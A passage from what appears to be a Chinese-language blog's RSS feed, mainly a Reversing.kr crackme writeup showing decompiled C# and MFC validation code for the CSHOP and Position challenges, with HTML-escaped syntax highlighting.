style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
};

&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Reversing.kr writeups</title>
        <link>/post/reversing-kr-writeups/</link>
        <pubDate>Thu, 13 Jan 2022 20:41:50 +0800</pubDate>
        
        <guid>/post/reversing-kr-writeups/</guid>
        <description>&lt;img src="/post/reversing-kr-writeups/cover.png" alt="Featured image of post Reversing.kr writeups" /&gt;&lt;h2 id=&#34;cshop&#34;&gt;CSHOP&lt;/h2&gt;
&lt;p&gt;按一下回车就通关了&lt;/p&gt;
&lt;p&gt;如果要查看逻辑的话，需要先使用 de4dot 脱壳，然后用 dnSpy 打开&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; Form1_Load(&lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt; sender, EventArgs e)
		{
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblSu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblGu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblNu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblKu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblZu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblMu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblTu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.ppppp.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblGu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblQu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.ppppp.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblTu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblXu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
		}

		&lt;span style=&#34;color:#75715e&#34;&gt;// Token: 0x06000004 RID: 4 RVA: 0x000021B0 File Offset: 0x000003B0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; btnStart_Click(&lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt; sender, EventArgs e)
		{
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblSu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;W&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblGu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblNu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblKu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;R&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblZu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;E&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblMu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;6&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblTu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;M&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.ppppp.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblGu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblQu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;S&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.ppppp.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblTu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;6&amp;#34;&lt;/span&gt;;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.lblXu.Text = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;S&amp;#34;&lt;/span&gt;;
		}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一开始的 &lt;code&gt;Text&lt;/code&gt; 被设置为了空格，而在点击了某个键之后就会设置为具体的值，所以按一下回车就能看到 flag&lt;/p&gt;
&lt;h2 id=&#34;position&#34;&gt;Position&lt;/h2&gt;
&lt;p&gt;这道题是 MFC 逆向&lt;/p&gt;
&lt;p&gt;利用 &lt;code&gt;Right&lt;/code&gt; 和 &lt;code&gt;Wrong&lt;/code&gt; 字符串找到逻辑&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __thiscall &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_401CD0&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  CWnd &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3; &lt;span style=&#34;color:#75715e&#34;&gt;// ecx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_401740((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (CWnd &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;188&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v2 )
    CWnd&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;SetWindowTextW(v3, &lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Correct!&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    CWnd&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;SetWindowTextW(v3, &lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong&amp;#34;&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;sub_401740&lt;/code&gt; 就是验证逻辑&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;  CWnd&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;GetWindowTextW(a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;304&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v50);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v50 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; )
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第一步验证输入长度是否为 4&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int16&lt;/span&gt;)ATL&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;CSimpleStringT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;::&lt;/span&gt;GetAt(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v50, v3) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61u&lt;/span&gt;
         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int16&lt;/span&gt;)ATL&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;CSimpleStringT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;::&lt;/span&gt;GetAt(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v50, v3) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7Au&lt;/span&gt; )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; )
      {
LABEL_7:
        v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
        {
          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v1 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v4 )
          {
            v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ATL&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;CSimpleStringT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;::&lt;/span&gt;GetAt(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v50, v4);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int16&lt;/span&gt;)ATL&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;CSimpleStringT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;::&lt;/span&gt;GetAt(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v50, v1) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; v5 )
              &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_2;
          }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随后利用双重循环，约束输入为小写字母并且没有重复&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;            CWnd&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;GetWindowTextW(a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;420&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v51);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v51 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int16&lt;/span&gt;)ATL&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;CSimpleStringT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;::&lt;/span&gt;GetAt(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v51, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; )
            {
              v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ATL&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;CSimpleStringT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;::&lt;/span&gt;GetAt(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v50, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
              v40 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
              v48 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
              v42 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
              v44 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
              v46 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
              v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ATL&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;CSimpleStringT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;::&lt;/span&gt;GetAt(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v50, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
              v32 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
              v38 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
              v34 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
              v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
              v36 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
              Buffer &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)ATL&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;CSimpleStringT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;::&lt;/span&gt;GetBuffer(v52);
              itow_s(v40 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v8, Buffer, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAu&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;);
              v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ATL&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;CSimpleStringT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;::&lt;/span&gt;GetAt(v52, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
